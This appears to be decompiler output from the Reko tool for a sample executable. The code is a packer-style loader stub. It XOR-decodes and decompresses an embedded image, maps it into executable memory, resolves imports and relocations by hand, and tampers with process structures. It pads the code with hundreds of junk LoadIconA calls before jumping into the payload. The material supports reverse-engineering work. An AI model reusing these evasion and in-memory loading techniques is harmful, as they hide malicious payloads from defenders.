// subject_data.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

struct Eq_52 * g_ptr405000 = &g_t4050; // 00405000
Eq_2 g_t405004 = // 00405004
	{
		&g_a5400
	};
Eq_3012 g_a405008[] = // 00405008
	{
	};
Eq_2 g_t4090CC = // 004090CC
	{
		null
	};
word32 g_dw4090D0 = 0x00; // 004090D0
word32 g_dw4090D4 = 0x00; // 004090D4
Eq_2 g_t4090D8 = // 004090D8
	{
		null
	};
ptr32 g_ptr4090DC = 0x00; // 004090DC
word32 g_dw4090E0 = 0x00; // 004090E0
Eq_2 g_t4090E4 = // 004090E4
	{
		null
	};
word32 g_dw4090E8 = 0x00; // 004090E8
struct Eq_85 * g_ptr4090EC = null; // 004090EC
<anonymous> * g_ptr4090F0 = null; // 004090F0
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__RegOpenKeyA = &g_t2B02; // 00401000
<anonymous> * __imp__LoadLibraryA = &g_t2A88; // 00401008
<anonymous> * __imp__CreateFileMappingA = &g_t2A98; // 0040100C
<anonymous> * __imp__GetProcAddress = &g_t2A68; // 00401010
<anonymous> * __imp__HeapAlloc = &g_t2ABE; // 00401014
<anonymous> * __imp__GetProcessHeap = &g_t2ACA; // 00401018
<anonymous> * __imp__VirtualAlloc = &g_t2AAE; // 0040101C
<anonymous> * __imp__CloseHandle = &g_t2A7A; // 00401020
<anonymous> * __imp__GetModuleHandleA = &g_t2A54; // 00401024
<anonymous> * __imp__LoadIconA = &g_t2AEA; // 0040102C
// 00401040: void fn00401040(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C)
// Called from:
//      fn00401290
//      fn004026F0
void fn00401040(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C)
{
	Eq_2 dwLoc08_33 = 0x00;
	while (dwLoc08_33 < dwArg0C)
	{
		Mem26[dwArg04 + dwLoc08_33:byte] = Mem13[dwArg08 + dwLoc08_33:byte];
		&dwLoc08_33.u0->a0000->b0000 = (word32) dwLoc08_33 + 1;
	}
}

// 004010D0: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ptr32 fp;
	word32 ebx;
	word32 esi;
	word32 edi;
	struct Eq_19 * fs;
	Eq_20 tLoc84;
	Eq_2 dwArg04;
	Eq_2 eax_20 = GetModuleHandleA(0x00);
	if (RegOpenKeyA((struct HKEY__ *) 0x80000002, 0x00409058, &tLoc84) != 0x00)
		return 0x01;
	if ((dwArg04 & 0xFFFF) != 0x00)
		g_dw4090E8 = 0x00;
	else
		g_dw4090E8 = 0x01;
	if (g_dw4090E8 != 0x00)
		g_t4090D8.u0 = (DWORD) dwArg04;
	struct Eq_52 * ecx_55 = g_ptr405000;
	Eq_2 eax_58 = g_t405004.u0;
	struct Eq_52 * dwLoc08_222;
	for (dwLoc08_222 = null; dwLoc08_222 < ecx_55; ++dwLoc08_222)
		dwLoc08_222[0x00080A01] = (struct Eq_52) (dwLoc08_222[0x00080A01] ^ 1222211);
	fn004026C0(eax_58);
	g_t4090E4.u0 = (DWORD) eax_58;
	fn00402870(g_a405008, g_t4090E4.u0, ecx_55);
	g_dw4090D4 = edi;
	g_dw4090D0 = esi;
	g_dw4090E0 = ebx;
	g_ptr4090EC = fs->ptr0018;
	g_ptr4090DC = fp - 4;
	if (g_dw4090E8 != 0x00)
		fn004026F0(0x0040122C - dwArg04, dwArg04);
	else
		fn004026F0(0x0040122C - eax_20, eax_20);
	fn00401290(g_t4090E4.u0);
	Eq_2 eax_167;
	word32 ecx_168;
	word32 edx_169;
	g_ptr4090F0();
	return eax_167;
}

// 00401270: void fn00401270(Stack Eq_2 dwArg04, Stack Eq_25 dwArg08)
// Called from:
//      fn00401290
void fn00401270(Eq_2 dwArg04, Eq_25 dwArg08)
{
	GetProcAddress(dwArg04, dwArg08);
}

// 00401290: void fn00401290(Stack Eq_2 dwArg04)
// Called from:
//      Win32CrtStartup
void fn00401290(Eq_2 dwArg04)
{
	ptr32 fp;
	Eq_132 eax_20 = GetProcAddress(GetModuleHandleA(0x00409080), 0x00409070);
	word32 edx_27 = dwArg04 + Mem24[dwArg04 + 60:word32];
	struct Eq_151 * dwLoc28_2415 = &edx_27->w0014 + 2 + (word32) edx_27->w0014 / 84;
	Eq_2 eax_44 = VirtualAlloc(0x00, edx_27->t0050.u0, 0x3000, 0x40);
	if (eax_44 == 0x00)
		return;
	Eq_132 eax_57 = GetProcAddress(GetModuleHandleA(0x0040909C), 0x00409090);
	fn00401040(eax_44, dwArg04, (word32) dwArg04.u6.u1[3].dw003C + 252 + (word32) edx_27->w0006 *s 0x28);
	up32 dwLoc0C_2428;
	for (dwLoc0C_2428 = 0x00; dwLoc0C_2428 < (word32) edx_27->w0006; ++dwLoc0C_2428)
	{
		if (dwLoc28_2415->dw0014 != 0x00 && dwLoc28_2415->dw0010 != 0x00)
			fn00401040(eax_44 + Mem2348[dwLoc28_2415 + 0x0C:word32], dwArg04 + Mem2343[dwLoc28_2415 + 20:word32], CONVERT(CONVERT(Mem84[dwLoc28_2415 + 16:word32] - 1 + Mem84[edx_27 + 60:word32], word32, uint64) /u Mem84[edx_27 + 60:word32], word32, uint32) *s Mem84[edx_27 + 60:word32]);
		++dwLoc28_2415;
	}
	word32 ecx_93 = eax_44 + Mem90[eax_44 + 60:word32];
	Eq_2 eax_110 = CreateFileMappingA(~0x00, null, 0x04, 0x00, ecx_93.u0->t0050.u0, 0x00);
	if (eax_110 == 0x00)
		return;
	word32 dwLoc4C_2441 = eax_44 + Mem112[ecx_93 + 0x80:word32];
	while (dwLoc4C_2441.u0[4] != 0x00)
	{
		Eq_283 dwLoc34_3089;
		Eq_284 dwLoc24_3088;
		word32 eax_2215 = LoadLibraryA(eax_44 + Mem121[dwLoc4C_2441 + 0x0C:word32]);
		if (dwLoc4C_2441.u1->t0000.u0 != 0x00)
		{
			dwLoc24_3088 = eax_44 + Mem2217[dwLoc4C_2441 + 0x00:word32];
			dwLoc34_3089 = eax_44 + Mem2233[dwLoc4C_2441 + 16:word32];
		}
		else
		{
			dwLoc24_3088 = eax_44 + Mem2217[dwLoc4C_2441 + 16:word32];
			dwLoc34_3089 = eax_44 + Mem2224[dwLoc4C_2441 + 0x00:word32];
		}
		word32 dwLoc18_3092 = 0x00;
		if (dwLoc4C_2441.u0[4] != 0x00 && ((dwLoc4C_2441.u1)->t0000).u0 != 0x00)
			dwLoc18_3092 = 0x01;
		while (dwLoc24_3088.u1->t0000.u0 != 0x00)
		{
			if ((dwLoc24_3088.u1->t0000.u0 & 0x80000000) != 0x00)
			{
				ui32 eax_2280 = dwLoc24_3088.u1->t0000.u0;
				fn00401270(eax_2215, eax_2280 & 0x7FFFFFFF);
				dwLoc24_3088.u1->t0000.u0 = eax_2280 & 0x7FFFFFFF;
			}
			else
			{
				word32 eax_2267 = Mem2249[dwLoc24_3088 + 0x00:word32] + 2 + eax_44;
				fn00401270(eax_2215, eax_2267);
				dwLoc24_3088.u1->t0000.u0 = (struct Eq_3062 *) eax_2267;
			}
			if (dwLoc24_3088.u1->t0000.u0 == 0x00)
				return;
			if (dwLoc18_3092 != 0x00)
				dwLoc34_3089.u1->t0000.u0 = dwLoc24_3088.u1->t0000.u0;
			dwLoc24_3088 += 0x04;
			dwLoc34_3089 += 0x04;
		}
		dwLoc4C_2441 += 0x14;
	}
	if (g_dw4090E8 != 0x00)
	{
		word32 edx_129 = g_t4090D8.u0 - ((ecx_93.u0)->t0034).u0;
		if (ecx_93.u0->dw00A4 != 0x00)
		{
			word32 dwLoc20_2446 = eax_44 + Mem130[ecx_93 + 0xA0:word32];
			while (dwLoc20_2446.u0[1] != 0x00)
			{
				uint32 edx_2163 = dwLoc20_2446.u0[1] - 0x08 >> 0x01;
				word32 dwLoc44_3075 = dwLoc20_2446 + 0x08;
				uint32 dwLoc0C_3076;
				for (dwLoc0C_3076 = 0x00; dwLoc0C_3076 < edx_2163; ++dwLoc0C_3076)
				{
					if ((word32) *((word32) dwLoc44_3075 + dwLoc0C_3076 * 0x02) >> 0x0C == 0x03)
						Mem2203[eax_44 + Mem2171[dwLoc20_2446 + 0x00:word32] + (CONVERT(dwLoc44_3075[dwLoc0C_3076 * 0x02], word16, word32) & 0x0FFF):word32] = Mem2171[eax_44 + Mem2171[dwLoc20_2446 + 0x00:word32] + (CONVERT(dwLoc44_3075[dwLoc0C_3076 * 0x02], word16, word32) & 0x0FFF):word32] + edx_129;
				}
				dwLoc20_2446 += Mem2171[dwLoc20_2446 + 4:word32];
			}
		}
	}
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	LoadIconA(null, 0x7F00);
	Eq_132 eax_1871 = GetProcAddress(GetModuleHandleA(0x004090BC), 0x004090AC);
	if (g_dw4090E8 != 0x00)
		g_t4090CC.u0 = (DWORD) eax_1871();
	else
		g_t4090CC.u0 = (DWORD) eax_1871();
	struct Eq_2487 * esp_1934 = fp - 0x68;
	if (g_t4090CC.u0 == 0x00)
	{
		ptr32 esp_1939;
		if (g_dw4090E8 != 0x00)
		{
			esp_1939 = fp - 0x6C;
			if (eax_20() == 0x00)
			{
				esp_1939 = fp - 0x78;
				if (eax_57() == 0x00)
					return;
			}
		}
		else
		{
			esp_1939 = fp - 0x6C;
			if (eax_20() == 0x00)
			{
				esp_1939 = fp - 0x78;
				if (eax_57() == 0x00)
					return;
			}
		}
		if (g_dw4090E8 != 0x00)
		{
			struct Eq_2634 * esp_2036 = esp_1939 - 4;
			esp_2036->t0000.u0 = g_t4090D8.u0;
			esp_2036->dwFFFFFFFC = 0x00;
			esp_2036->dwFFFFFFF8 = 0x00;
			esp_2036->dwFFFFFFF4 = 0x00;
			esp_2036->dwFFFFFFF0 = 0x22;
			esp_2036->tFFFFFFEC.u0 = (DWORD) eax_110;
			g_t4090CC.u0 = (DWORD) eax_1871();
		}
		else
		{
			struct Eq_2604 * esp_2011 = esp_1939 - 4;
			esp_2011->t0000.u0 = ecx_93.u0->t0034.u0;
			esp_2011->dwFFFFFFFC = 0x00;
			esp_2011->dwFFFFFFF8 = 0x00;
			esp_2011->dwFFFFFFF4 = 0x00;
			esp_2011->dwFFFFFFF0 = 0x22;
			esp_2011->tFFFFFFEC.u0 = (DWORD) eax_110;
			g_t4090CC.u0 = (DWORD) eax_1871();
		}
		esp_1934 = esp_1939 - 24;
		if (g_t4090CC.u0 == 0x00)
		{
			if (g_dw4090E8 == 0x00)
			{
				esp_1934->tFFFFFFFC.u0 = 0x40;
				esp_1934->tFFFFFFF8.u0 = 0x3000;
				esp_1934->tFFFFFFF4.u0 = ecx_93.u0->t0050.u0;
				esp_1934->tFFFFFFF0.u0 = ecx_93.u0->t0034.u0;
				g_t4090CC.u0 = (DWORD) VirtualAlloc(esp_1934->tFFFFFFF0.u5, esp_1934->tFFFFFFF4.u0, esp_1934->tFFFFFFF8.u0, esp_1934->tFFFFFFFC.u0);
			}
			else
			{
				esp_1934->tFFFFFFFC.u0 = 0x40;
				esp_1934->tFFFFFFF8.u0 = 0x3000;
				esp_1934->tFFFFFFF4.u0 = ecx_93.u0->t0050.u0;
				esp_1934->tFFFFFFF0.u0 = g_t4090D8.u0;
				g_t4090CC.u0 = (DWORD) VirtualAlloc(esp_1934->tFFFFFFF0.u5, esp_1934->tFFFFFFF4.u0, esp_1934->tFFFFFFF8.u0, esp_1934->tFFFFFFFC.u0);
			}
		}
	}
	struct Eq_2493 * esp_2096 = esp_1934 - 4;
	esp_2096->t0000.u0 = (DWORD) eax_110;
	CloseHandle(esp_2096->t0000.u5);
	esp_2096->t0000.u0 = ecx_93.u0->t0050.u0;
	esp_2096->tFFFFFFFC.u0 = (DWORD) eax_44;
	esp_2096->tFFFFFFF8.u0 = g_t4090CC.u0;
	fn00401040(esp_2096->tFFFFFFF8.u0, esp_2096->tFFFFFFFC.u0, esp_2096->t0000.u0);
	if (g_dw4090E8 != 0x00)
	{
		Mem2131[esp_2096 + 0x00:word32] = Mem2109[0x004090CC<p32>:word32] + Mem2109[ecx_93 + 40:word32];
		esp_2096->tFFFFFFFC.u0 = g_t4090D8.u0;
		fn00402650(esp_2096->tFFFFFFFC.u0, esp_2096->t0000.u0);
	}
	else
	{
		esp_2096->t0000.u0 = g_t4090CC.u0;
		fn00402840(esp_2096->t0000.u0);
	}
	Mem2151[0x004090F0<p32>:word32] = Mem2146[0x004090CC<p32>:word32] + Mem2146[ecx_93 + 40:word32];
	ecx_93.u0->ptr0028 = g_ptr4090F0;
}

// 00402650: void fn00402650(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00401290
void fn00402650(Eq_2 dwArg04, Eq_2 dwArg08)
{
	struct Eq_2748 * ecx_15 = g_ptr4090EC->ptr0030->ptr000C->ptr000C;
	struct Eq_2748 * dwLoc0C_61 = ecx_15;
	while (dwLoc0C_61 != null)
	{
		if (dwLoc0C_61->t0018.u0 == dwArg04)
		{
			dwLoc0C_61->t001C.u0 = (DWORD) dwArg08;
			return;
		}
		struct Eq_2748 * eax_37 = dwLoc0C_61->ptr0000;
		dwLoc0C_61 = eax_37;
		if (eax_37 == ecx_15)
			return;
	}
}

// 004026C0: void fn004026C0(Stack Eq_2 dwArg04)
// Called from:
//      Win32CrtStartup
void fn004026C0(Eq_2 dwArg04)
{
	HeapAlloc(GetProcessHeap(), 0x00, dwArg04);
}

// 004026F0: void fn004026F0(Stack ptr32 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      Win32CrtStartup
void fn004026F0(ptr32 dwArg04, Eq_2 dwArg08)
{
	Eq_2 dwLoc20_155;
	if (g_dw4090E8 != 0x00)
		&dwLoc20_155.u0->a0000->b0000 = g_t4090D8.u0;
	else
		dwLoc20_155 = dwArg08;
	struct Eq_2789 * eax_22 = &(dwLoc20_155.u0 + ((&((dwLoc20_155.u0))[60].a0000))[0].b0000)->a0000->b0000;
	g_t4090CC.u0 = (DWORD) VirtualAlloc(0x00, eax_22->t0050.u0, 0x3000, 0x40);
	if (g_t4090CC.u0 == 0x00)
		return;
	fn00401040(g_t4090CC.u0, dwLoc20_155, eax_22->t0050.u0);
	int32 ecx_57 = g_t4090CC.u0 - dwLoc20_155;
	if (eax_22->dw00A4 != 0x00)
	{
		struct Eq_2828 * dwLoc0C_167 = &(dwLoc20_155.u0 + eax_22->dw00A0)->a0000->b0000;
		while (dwLoc0C_167->t0004.u0 != 0x00)
		{
			uint32 ecx_94 = dwLoc0C_167->t0004.u0 - 0x08 >> 0x01;
			word16 dwLoc1C_177[] = (char *) &dwLoc0C_167->t0004 + 4;
			uint32 dwLoc08_178;
			for (dwLoc08_178 = 0x00; dwLoc08_178 < ecx_94; ++dwLoc08_178)
			{
				if ((word32) dwLoc1C_177[dwLoc08_178] >> 0x0C == 0x03)
					(&(g_t4090CC.u0 + dwLoc0C_167->dw0000)->a0000->b0000)[(word32) dwLoc1C_177[dwLoc08_178] & 0x0FFF] = (byte) ((&(g_t4090CC.u0 + dwLoc0C_167->dw0000)->a0000->b0000)[(word32) dwLoc1C_177[dwLoc08_178] & 0x0FFF] + ecx_57);
			}
			dwLoc0C_167 += dwLoc0C_167->t0004.u0 / 8;
		}
	}
	<anonymous> * edx_75 = &(g_t4090CC.u0 + dwArg04)->a0000->b0000;
	edx_75();
}

// 00402840: void fn00402840(Stack Eq_2 dwArg04)
// Called from:
//      fn00401290
void fn00402840(Eq_2 dwArg04)
{
	g_ptr4090EC->ptr0030->t0008.u0 = (DWORD) dwArg04;
}

// 00402870: void fn00402870(Stack (ptr32 Eq_9) dwArg04, Stack Eq_2 dwArg08, Stack (ptr32 Eq_52) dwArg0C)
// Called from:
//      Win32CrtStartup
void fn00402870(struct Eq_9 * dwArg04, Eq_2 dwArg08, struct Eq_52 * dwArg0C)
{
	Eq_2900 tLoc20;
	Eq_2901 tLoc10;
	struct Eq_52 * dwLoc0C_129 = (struct Eq_52 *) 0x01;
	Eq_9 cl_12 = dwArg04->b0000;
	int32 dwLoc18_132 = 0x00;
	do
	{
		byte al_19 = Mem16[dwArg04 + dwLoc0C_129:byte];
		dwLoc0C_129 = (struct Eq_52 *) ((char *) dwLoc0C_129 + 1);
		if ((word32) al_19 == (word32) cl_12)
		{
			if (CONVERT(Mem23[dwArg04 + (dwLoc0C_129 + 0x01):byte], byte, word32) == 0x00)
			{
				dwArg08.u3[dwLoc18_132] = (char) cl_12;
				++dwLoc18_132;
				dwLoc0C_129 = (struct Eq_52 *) ((char *) dwLoc0C_129 + 2);
			}
			else
			{
				word32 eax_60 = fn00402970(&tLoc10, dwArg04 + (dwLoc0C_129 + 0x01)) + (dwLoc0C_129 + 0x01);
				dwLoc0C_129 = fn00402970(&tLoc20, dwArg04 + eax_60 / 4) + eax_60;
				up32 dwLoc1C_147;
				for (dwLoc1C_147 = 0x00; dwLoc1C_147 < tLoc10; ++dwLoc1C_147)
				{
					dwArg08.u3[dwLoc18_132] = dwArg08.u3[dwLoc18_132 - tLoc20];
					++dwLoc18_132;
				}
			}
		}
		else
		{
			dwArg08.u3[dwLoc18_132] = al_19;
			++dwLoc18_132;
		}
	} while (dwLoc0C_129 < dwArg0C);
}

// 00402970: Register word32 fn00402970(Stack (ptr32 ui32) dwArg04, Stack (ptr32 byte) dwArg08)
// Called from:
//      fn00402870
word32 fn00402970(ui32 * dwArg04, byte * dwArg08)
{
	ui32 dwLoc08_44 = 0x00;
	word32 dwLoc10_45 = 0x00;
	do
	{
		ui32 ecx_15 = (word32) *dwArg08;
		ui32 ecx_25 = ecx_15 & 0x7F | dwLoc08_44 << 0x07;
		++dwArg08;
		dwLoc08_44 = ecx_25;
		++dwLoc10_45;
	} while ((ecx_15 & 0x80) != 0x00);
	*dwArg04 = ecx_25;
	return dwLoc10_45;
}

word32 g_dw402A20 = 11010; // 00402A20
word32 g_dw402A28 = 10888; // 00402A28
word32 g_dw402A2C = 10904; // 00402A2C
word32 g_dw402A30 = 0x2A68; // 00402A30
word32 g_dw402A34 = 0x2ABE; // 00402A34
word32 g_dw402A38 = 0x2ACA; // 00402A38
word32 g_dw402A3C = 0x2AAE; // 00402A3C
word32 g_dw402A40 = 0x2A7A; // 00402A40
word32 g_dw402A44 = 0x2A54; // 00402A44
word32 g_dw402A4C = 0x2AEA; // 00402A4C
